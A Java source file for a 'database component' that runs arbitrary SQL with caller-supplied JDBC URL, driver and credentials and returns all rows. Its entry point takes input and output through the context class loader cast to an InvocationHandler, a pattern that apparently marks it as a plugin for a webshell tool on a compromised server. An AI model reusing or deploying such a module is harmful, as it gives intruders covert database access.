package org.leo.core.component;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashMap;

/**
 * 数据库操作组件
 * 提供基础的JDBC数据库操作，兼容Java 1.5+
 * 
 * @author LeoSpring
 * @version 2.1
 */
public class DatabaseComponent implements Runnable {

    
    private HashMap params;
    private HashMap results;


    /**
     * 组件执行入口
     */
    @SuppressWarnings("unchecked")

    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


    /**
     * 主要执行方法
     */
    public void invoke() throws Exception {
        String url = (String) params.get("url");
        String user = (String) params.get("user");
        String password = (String) params.get("password");
        String sql = (String) params.get("sql");
        String driver = (String) params.get("driver");

        // 参数校验，统一返回格式
        if (url == null || url.trim().isEmpty() || sql == null || sql.trim().isEmpty()) {
            results.put("code", 400);
            results.put("msg", "缺少必填参数: url 或 sql");
            results.put("columns", new ArrayList<HashMap>());
            results.put("rows", new ArrayList<HashMap>());
            results.put("rowCount", null);
            results.put("updateCount", 0);
            return;
        }

        ArrayList<HashMap> columns = new ArrayList();
        ArrayList<HashMap> rows = new ArrayList();
        int updateCount = 0;
        Connection conn = null;
        Statement stmt = null;
        ResultSet rs = null;
        try {
            Class.forName(driver, true, Thread.currentThread().getContextClassLoader());
            conn = DriverManager.getConnection(url, user, password);
            stmt = conn.createStatement();
            boolean hasResult = stmt.execute(sql);
            if (hasResult) {
                rs = stmt.getResultSet();
                ResultSetMetaData metaData = rs.getMetaData();
                int columnCount = metaData.getColumnCount();
                for (int i = 1; i <= columnCount; i++) {
                    HashMap column = new HashMap();
                    column.put("name", metaData.getColumnName(i));
                    column.put("label", metaData.getColumnLabel(i));
                    column.put("type", metaData.getColumnTypeName(i));
                    column.put("jdbcType", Integer.valueOf(metaData.getColumnType(i)));
                    columns.add(column);
                }
                while (rs.next()) {
                    HashMap row = new HashMap();
                    for (int i = 1; i <= columnCount; i++) {
                        row.put(metaData.getColumnLabel(i), rs.getObject(i));
                    }
                    rows.add(row);
                }
            } else {
                updateCount = stmt.getUpdateCount();
            }
            results.put("columns", columns);
            results.put("rows", rows);
            results.put("rowCount", rows.size());
            results.put("updateCount", updateCount);
            results.put("code", 200);
            results.put("msg", "执行成功");
        } catch (Exception ex) {
            results.put("code", 500);
            results.put("msg", ex.getMessage());
            throw ex;
        } finally {
            closeResource(rs, "ResultSet");
            closeResource(stmt, "Statement");
            closeResource(conn, "Connection");
        }
    }

    /**
     * 安全关闭资源
     */
    private void closeResource(AutoCloseable resource, String resourceName) {
        if (resource != null) {
            try {
                resource.close();
            } catch (Exception e) {
                // 忽略关闭资源时的异常
            }
        }
    }
}
